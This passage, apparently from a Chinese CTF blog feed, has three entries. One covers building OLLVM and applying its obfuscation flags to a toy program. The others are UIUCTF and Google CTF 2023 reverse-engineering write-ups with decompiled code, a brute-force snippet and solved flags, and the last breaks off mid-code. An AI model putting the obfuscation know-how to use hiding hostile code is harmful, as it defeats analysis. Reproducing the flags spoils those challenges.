-mllvm -bcf_loop=3：如果激活了传递，则在函数上应用 3 次。默认值：1  -mllvm -bcf_prob=40：如果激活了传递，基本块将以 40％的概率进行模糊处理。默认值：30</p>\n<h4 id=\"其他\"><a class=\"markdownIt-Anchor\" href=\"#其他\">#</a> <strong>其他</strong></h4>\n<p>-mllvm -sobf 开启字符串混淆</p>\n<p>-mllvm -seed=0xdeadbeaf 指定随机数种子生成器</p>\n<h2 id=\"开搭\"><a class=\"markdownIt-Anchor\" href=\"#开搭\">#</a> 开搭</h2>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>How to Build:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  $ <span class=\"token function\">git</span> clone https://github.com/yazhiwang/ollvm-tll.git</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  $ <span class=\"token function\">mkdir</span> build</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  $ <span class=\"token builtin class-name\">cd</span> build</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  $ cmake <span class=\"token parameter variable\">-G</span> <span class=\"token string\">\"MinGW Makefiles\"</span> <span class=\"token parameter variable\">-DCMAKE_BUILD_TYPE</span><span class=\"token operator\">=</span>Release <span class=\"token punctuation\">..</span>/ollvm-tll/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  $ <span class=\"token function\">make</span> <span class=\"token parameter variable\">-j7</span></pre></td></tr></table></figure><p>然后我的 gcc cmake g++ 版本如下</p>\n<p><img data-src=\"/images/image-20230709134009895.png\" alt=\"image-20230709134009895\"></p>\n<p><img data-src=\"/images/image-20230709134643782.png\" alt=\"image-20230709134643782\"></p>\n<p><img data-src=\"/images/image-20230710003250157.png\" alt=\"image-20230710003250157\"></p>\n<p>编译个 Ollvm 编 2 个小时了 还是 57% 一直跳 warning 我都不知道对不对</p>\n<p><img data-src=\"/images/image-20230710011307513.png\" alt=\"image-20230710011307513\"></p>\n<p>好像确实要两个小时 是正常的</p>\n<h2 id=\"编译一个小例子看看\"><a class=\"markdownIt-Anchor\" href=\"#编译一个小例子看看\">#</a> 编译一个小例子看看</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"VAIBIBABO\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> k<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>/home/mou/ 桌面 /build/bin/clang vaibi.c -mllvm -fla  -mllvm -sobf  -mllvm -bcf -o a</p>\n<p>IDA 中看看</p>\n<p><img data-src=\"/images/image-20230710140331470.png\" alt=\"image-20230710140331470\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+30h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+34h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">1860951317</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">2018413106</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        v7 <span class=\"token operator\">=</span> <span class=\"token number\">1565625762</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>byte_404030<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v8<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1375518149</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>byte_404033<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      v7 <span class=\"token operator\">=</span> <span class=\"token number\">1843433062</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">==</span> <span class=\"token number\">24246500</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">560024662</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        v4 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1375518149</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>y_4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        envp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> y_4 <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>envp <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          v4 <span class=\"token operator\">=</span> <span class=\"token number\">1843433062</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        v7 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1565625762</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token operator\">++</span>v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        v7 <span class=\"token operator\">=</span> <span class=\"token number\">1860951317</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1843433062</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>byte_404033<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        v5 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1375518149</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>y_4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        envp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>x_3<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> y_4 <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>envp <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>          v5 <span class=\"token operator\">=</span> <span class=\"token number\">24246500</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        v7 <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        v3 <span class=\"token operator\">=</span> <span class=\"token number\">560024662</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>          v3 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2018413106</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        v7 <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>成功混淆</p>\n<p><strong>如果没有进行 sudo make install , 则需要在 bin 目录下编译源程序或者指定 clang 路径</strong></p>\n<p>LLVM 编译器框架下，不同的前端可以生成统一的中间表示 (LLVM IR)</p>\n<p>LLVM 编译器可分为三个部分</p>\n<p>前端对源代码进行分析并将其转换为 IR (中间代码)</p>\n<p>(优化器) 中端对生成的 IR 进行分析和优化</p>\n<p>后端将 IR 转换为原生机器代码</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/03/UIUCTF2023/",
            "url": "https://3cly.github.io/2023/07/03/UIUCTF2023/",
            "title": "UIUCTF2023",
            "date_published": "2023-07-03T07:51:49.000Z",
            "content_html": "<h1 id=\"uiuctf\"><a class=\"markdownIt-Anchor\" href=\"#uiuctf\">#</a> UIUCTF</h1>\n<p>做了一道题就摆烂了 (第二天考试) Win95 的主题挺有特色</p>\n<h2 id=\"vmwhere1\"><a class=\"markdownIt-Anchor\" href=\"#vmwhere1\">#</a> VMWHERE1</h2>\n<p><img data-src=\"/images/image-20230701112737549.png\" alt=\"image-20230701112737549\"></p>\n<p>给了两个文件一个 chal 是虚拟机程序  一个 program 是二进制文件 就是需要用虚拟机载入的程序</p>\n<h3 id=\"chal\"><a class=\"markdownIt-Anchor\" href=\"#chal\">#</a> chal</h3>\n<p><img data-src=\"/images/image-20230703143835828.png\" alt=\"image-20230703143835828\"></p>\n<p>IDA7.7 打开虚拟机程序，逻辑很清晰 while 循环和 switch-case 其中每一个 case 对应一个操作</p>\n<p>可以用 x86 汇编指令近似理解</p>\n<ul>\n<li>case 0: 返回指令（ret）</li>\n<li>case 1: 加法指令（add）</li>\n<li>case 2: 减法指令（sub）</li>\n<li>case 3: 位与指令（and）</li>\n<li>case 4: 位或指令（or）</li>\n<li>case 5: 位异或指令（xor）</li>\n<li>case 6: 左移指令（shl）</li>\n<li>case 7: 右移指令（shr）</li>\n<li>case 8: 获取输入指令（getchar）</li>\n<li>case 9: 输出指令（putchar）</li>\n<li>case 0xA: 赋值指令（push）</li>\n<li>case 0xB: 条件跳转指令（jz）</li>\n<li>case 0xC: 条件跳转指令（jnz）</li>\n<li>case 0xD: 无条件跳转指令（jmp）</li>\n<li>case 0xE: 减一指令（dec）</li>\n<li>case 0xF: 复制</li>\n<li>case 0x28: 调用子函数指令</li>\n</ul>\n<p>这里注意一点是通过 getchar () 函数读取输入，而 C 语言的 getchar () 函数一次只读取一个，多余的都会忽略，可以猜测对 flag 的验证是一位一位的验证</p>\n<h3 id=\"program\"><a class=\"markdownIt-Anchor\" href=\"#program\">#</a> program</h3>\n<p>010Editor 打开</p>\n<p><img data-src=\"/images/image-20230703144613400.png\" alt=\"image-20230703144613400\"></p>\n<p>可以看到文件开头和结尾则是程序运行和结束时会提示的字符串 中间就是需要分析的 code</p>\n<h3 id=\"动态调试\"><a class=\"markdownIt-Anchor\" href=\"#动态调试\">#</a> 动态调试</h3>\n<p>思路是在输入时候下断点 只分析后面的 code 就行了</p>\n<p><img data-src=\"/images/image-20230703145015778.png\" alt=\"image-20230703145015778\"></p>\n<p>在 getchar () 这里下断点  (每个指令后面的 goto LABEL_31 不用管，就是验证指令是否合法以及栈是否溢出)</p>\n<p>然后一直 F8 找到验证 flag 的逻辑  发现每当运行在这里 也就是程序 code 为<strong> 08 0F 0A 04 07 05 05 0F 0A XX 05 0C 00 03 0D</strong> 是一个固定的一串指令在 program 中是负责对 flag 的每一位进行检查 (v10 的前一位是否为 0) 通过即跳转 若错误则会进入 0xD 的跳转 然后就跳转到 program 末尾 输出错误字符串</p>\n<p><img data-src=\"/images/image-20230701152849383.png\" alt=\"image-20230701152849383\"></p>\n<p>于是我们的目标就是让他通过验证就行了 而每一位的验证逻辑都一样 分析第一位就行了</p>\n<p>这里我写了前三位的示例</p>\n<p>(password[0]&gt;&gt;4) ^ password[0] ^ 0x72 ^ 0x00==0  password[0]=’u’</p>\n<p>(password[1]&gt;&gt;4) ^ password[1] ^ 0x72 ^ 0x1d==0  password[1]= ‘i’</p>\n<p>(password[2]&gt;&gt;4) ^ password[2] ^ 0x1d ^ 0x6f==0   password[2]=’u’</p>\n<p>…</p>\n<p><strong>(password[i]&gt;&gt;4) ^ password[i] ^ 0xXX ^ 0xXX==0</strong></p>\n<p>08 0F 0A 04 07 05 05 0F 0A XX 05 0C 00 03 0D 的验证逻辑就是这样，其中除了第一位的第一个 0xXX 的值为 0x00 后面的 0xXX 的值都是 push 进去的值和前一次验证时 push 的值</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230701164247.png\" alt=\"QQ图片20230701164247\"></p>\n<p>直接在 program 中找出 0xXX 再自己异或就行辣</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> password_0 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>password_0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> password_0 <span class=\"token operator\">^</span> <span class=\"token number\">0x72</span><span class=\"token operator\">^</span><span class=\"token number\">0x1d</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password[0] =\"</span><span class=\"token punctuation\">,</span> password_0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>类似这样解出所有位就行了</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>uiuctf<span class=\"token punctuation\">&#123;</span>ar3_y0u_4_r3al_vm_wh3r3_<span class=\"token punctuation\">(</span>gpt _g3n3r4t3d _th1s _f14g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230703140220.png\" alt=\"QQ图片20230703140220\"></p>\n<h2 id=\"vmwhere2\"><a class=\"markdownIt-Anchor\" href=\"#vmwhere2\">#</a> VMWHERE2</h2>\n<p>输入第一位变二进制 再 push ff</p>\n<p><img data-src=\"/images/image-20230702115936644.png\" alt=\"image-20230702115936644\"></p>\n<p>前一位 0xff</p>\n<p><img data-src=\"/images/image-20230702121556088.png\" alt=\"image-20230702121556088\"></p>\n<p>没做了 蹲 WP</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/03/Google-CTF-2023/",
            "url": "https://3cly.github.io/2023/07/03/Google-CTF-2023/",
            "title": "Google CTF 2023",
            "date_published": "2023-07-03T07:51:13.000Z",
            "content_html": "<h1 id=\"google-ctf-2023\"><a class=\"markdownIt-Anchor\" href=\"#google-ctf-2023\">#</a> Google CTF 2023</h1>\n<h2 id=\"zermatt\"><a class=\"markdownIt-Anchor\" href=\"#zermatt\">#</a> ZerMatt</h2>\n<p>给的是混淆后的 lua 的源码 vscode 中 按 shift+alt+f 可格式化</p>\n<p>下载 lua5.3 运行一下</p>\n<p><img data-src=\"/images/image-20230624101916067.png\" alt=\"image-20230624101916067\"></p>\n<p><img data-src=\"/images/image-20230624110539119.png\" alt=\"image-20230624110539119\"></p>\n<p>luaide 没调起</p>\n<p>失败和成功字符串都要经过 v7 函数之后再打印出来 v7 就是一个异或</p>\n<p><img data-src=\"/images/image-20230624135556506.png\" alt=\"image-20230624135556506\"></p>\n<p><img data-src=\"/images/image-20230624150849918.png\" alt=\"image-20230624150849918\"></p>\n<p><img data-src=\"/images/image-20230624151216266.png\" alt=\"image-20230624151216266\"> 可疑的 v21 打印就是 flag</p>\n<p><img data-src=\"/images/image-20230624150633183.png\" alt=\"image-20230624150633183\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CTF<span class=\"token punctuation\">&#123;</span>At_least_it_was_not_a_bytecode_base_sandbox_escape<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"old-school\"><a class=\"markdownIt-Anchor\" href=\"#old-school\">#</a> Old School</h2>\n<p><img data-src=\"/images/image-20230624210921273.png\" alt=\"image-20230624210921273\"></p>\n<p><img data-src=\"/images/image-20230624201207803.png\" alt=\"image-20230624201207803\"></p>\n<p>这个函数是验证密码的组成:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  m <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> input<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> k <span class=\"token operator\">==</span> <span class=\"token number\">5</span> <span class=\"token operator\">||</span> k <span class=\"token operator\">==</span> <span class=\"token number\">11</span> <span class=\"token operator\">||</span> k <span class=\"token operator\">==</span> <span class=\"token number\">17</span> <span class=\"token operator\">||</span> k <span class=\"token operator\">==</span> <span class=\"token number\">23</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> input<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">45</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      v39 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token 